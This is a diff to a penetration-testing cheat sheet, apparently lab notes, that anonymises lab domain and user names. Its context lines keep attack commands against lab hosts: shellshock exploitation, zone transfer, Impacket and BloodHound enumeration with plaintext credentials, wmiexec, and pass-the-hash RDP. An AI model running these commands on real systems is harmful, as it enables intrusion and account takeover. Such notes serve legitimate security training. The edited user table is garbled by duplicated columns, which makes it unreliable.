@@ -340,7 +340,7 @@ python2 shellshock.py 10.11.1.231 useradm@mail.local 192.168.119.168 139 root@ma
 ````
 #### DNS port 53
 ````
-dnsrecon -d heist.offsec -n 192.168.54.165 -t axfr
+dnsrecon -d heist.example -n 192.168.54.165 -t axfr
 ````
 #### HTTP(S) port 80,443
 ##### FingerPrinting
@@ -896,11 +896,11 @@ ldapsearch -x -H ldap://192.168.214.122 -s base namingcontexts
 
 #
 dn:
-namingcontexts: DC=hutch,DC=offsec
-namingcontexts: CN=Configuration,DC=hutch,DC=offsec
-namingcontexts: CN=Schema,CN=Configuration,DC=hutch,DC=offsec
-namingcontexts: DC=DomainDnsZones,DC=hutch,DC=offsec
-namingcontexts: DC=ForestDnsZones,DC=hutch,DC=offsec
+namingcontexts: DC=exampleH,DC=example
+namingcontexts: CN=Configuration,DC=exampleH,DC=example
+namingcontexts: CN=Schema,CN=Configuration,DC=exampleH,DC=example
+namingcontexts: DC=DomainDnsZones,DC=exampleH,DC=example
+namingcontexts: DC=ForestDnsZones,DC=exampleH,DC=example
 
 # search result
 search: 2
@@ -910,7 +910,7 @@ result: 0 Success
 # numEntries: 1
 ````
 ````
-ldapsearch -x -H ldap://192.168.214.122 -b "DC=hutch,DC=offsec"
+ldapsearch -x -H ldap://192.168.214.122 -b "DC=exampleH,DC=example"
 ````
 #### MSSQL port 1433
 ##### Enumeration
@@ -1834,7 +1834,7 @@ Compressed: 25312
 ### Logging in/Changing users
 #### rdp
 ````
-rdesktop -u 'Nathan' -p 'abc123//' 192.168.129.59 -g 94% -d OFFSEC
+rdesktop -u 'Nathan' -p 'abc123//' 192.168.129.59 -g 94% -d example
 xfreerdp /v:10.1.1.89 /u:xavier /pth:5e22b03be22022754bf0975251e1e7ac
 ````
 ## Buffer Overflow <img src="https://w7.pngwing.com/pngs/331/576/png-transparent-computer-icons-stack-overflow-encapsulated-postscript-stacking-angle-text-stack-thumbnail.png" width="40" height="40" />
@@ -3834,7 +3834,7 @@ nmap -p88 --min-rate 1000 10.11.1.20-24 #looking for DC
 ````
 ##### Impacket
 ````
-impacket-GetADUsers -dc-ip 192.168.214.122 "hutch.offsec/" -all 
+impacket-GetADUsers -dc-ip 192.168.214.122 "exampleH.example/" -all 
 ````
 ````
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
@@ -3859,7 +3859,7 @@ fmcsorley                                             2020-11-04 00:35:05.815275
 ````
 ###### Creds
 ````
-impacket-GetADUsers -dc-ip 192.168.214.122 hutch.offsec/fmcsorley:CrabSharkJellyfish192 -all
+impacket-GetADUsers -dc-ip 192.168.214.122 exampleH.example/fmcsorley:CrabSharkJellyfish192 -all
 ````
 ````
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
@@ -3870,34 +3870,34 @@ Name                  Email                           PasswordLastSet      LastL
 Admin                                         2023-05-19 17:01:26.839372  2020-11-04 00:58:40.654236 
 Guest                                                 <never>              <never>             
 krbtgt                                                2020-11-04 00:26:23.099902  <never>             
-rplacidi                                              2020-11-04 00:35:05.106274  <never>             
-opatry                                                2020-11-04 00:35:05.216273  <never>             
-ltaunton                                              2020-11-04 00:35:05.264272  <never>             
-acostello                                             2020-11-04 00:35:05.315273  <never>             
-jsparwell                                             2020-11-04 00:35:05.377272  <never>             
-oknee                                                 2020-11-04 00:35:05.433274  <never>             
-jmckendry                                             2020-11-04 00:35:05.492273  <never>             
-avictoria                                             2020-11-04 00:35:05.545279  <never>             
-jfrarey                                               2020-11-04 00:35:05.603273  <never>             
-eaburrow                                              2020-11-04 00:35:05.652273  <never>             
-cluddy                                                2020-11-04 00:35:05.703274  <never>             
-agitthouse                                            2020-11-04 00:35:05.760273  <never>             
-fmcsorley                                             2020-11-04 00:35:05.815275  2021-02-16 08:39:34.483491 
+USERA                                              2020-11-04 00:35:05.106274  <never>             
+USERB                                                2020-11-04 00:35:05.216273  <never>             
+USERC                                                 2020-11-04 00:35:05.216273  <never>                                                           2020-11-04 00:35:05.264272  <never>             
+USERD                                                 2020-11-04 00:35:05.216273  <never>                                                          2020-11-04 00:35:05.315273  <never>             
+jUSERE                                                 2020-11-04 00:35:05.216273  <never>                                                          2020-11-04 00:35:05.377272  <never>             
+USERF                                                2020-11-04 00:35:05.216273  <never>                                                              2020-11-04 00:35:05.433274  <never>             
+USERG                                                 2020-11-04 00:35:05.216273  <never>                                                          2020-11-04 00:35:05.492273  <never>             
+USERG                                                 2020-11-04 00:35:05.216273  <never>                                                          2020-11-04 00:35:05.545279  <never>             
+USERH                                                 2020-11-04 00:35:05.216273  <never>                                                            2020-11-04 00:35:05.603273  <never>             
+USERI                                                 2020-11-04 00:35:05.216273  <never>                                                           2020-11-04 00:35:05.652273  <never>             
+USERJ                                                 2020-11-04 00:35:05.216273  <never>                                                            2020-11-04 00:35:05.703274  <never>             
+USERK                                                 2020-11-04 00:35:05.216273  <never>                                                         2020-11-04 00:35:05.760273  <never>             
+USERL                                                 2020-11-04 00:35:05.216273  <never>                                                          2020-11-04 00:35:05.815275  2021-02-16 08:39:34.483491 
 domainadmin                                           2021-02-16 00:24:22.190351  2023-05-19 16:58:10.073764
 ````
 ##### Bloodhound.py
 ````
-/opt/BloodHound.py/bloodhound.py -d hutch.offsec -u fmcsorley -p CrabSharkJellyfish192 -c all -ns 192.168.214.122
+/opt/BloodHound.py/bloodhound.py -d exampleH.example -u fmcsorley -p CrabSharkJellyfish192 -c all -ns 192.168.214.122
 ````
 ````
-INFO: Found AD domain: hutch.offsec
+INFO: Found AD domain: exampleH.example
 INFO: Getting TGT for user
-WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (hutch.offsec:88)] [Errno 111] Connection refused
-INFO: Connecting to LDAP server: hutchdc.hutch.offsec
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (exampleH.example:88)] [Errno 111] Connection refused
+INFO: Connecting to LDAP server: exampleHdc.exampleH.example
 INFO: Found 1 domains
 INFO: Found 1 domains in the forest
 INFO: Found 1 computers
-INFO: Connecting to LDAP server: hutchdc.hutch.offsec
+INFO: Connecting to LDAP server: exampleHdc.exampleH.example
 INFO: Found 18 users
 INFO: Found 52 groups
 INFO: Found 2 gpos
@@ -3905,7 +3905,7 @@ INFO: Found 1 ous
 INFO: Found 19 containers
 INFO: Found 0 trusts
 INFO: Starting computer enumeration with 10 workers
-INFO: Querying computer: hutchdc.hutch.offsec
+INFO: Querying computer: exampleHdc.exampleH.example
 INFO: Done in 00M 12S
 
 ````
@@ -4093,7 +4093,7 @@ impacket-wmiexec medtech/leon:'rabbit:)'@172.16.138.10
 ````
 ###### RDP
 ````
-rdesktop -u 'Nathan' -p 'abc123//' 192.168.129.59 -g 94% -d OFFSEC
+rdesktop -u 'Nathan' -p 'abc123//' 192.168.129.59 -g 94% -d example
 xfreerdp /v:10.1.1.89 /u:xavier /pth:5e22b03be22022754bf0975251e1e7ac
 xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1600 /v:192.168.238.191 /u:admin /p:password
 xfreerdp /u:admin  /v:192.168.238.191 /cert:ignore /p:"password"  /timeout:20000 /drive:home,/tmp
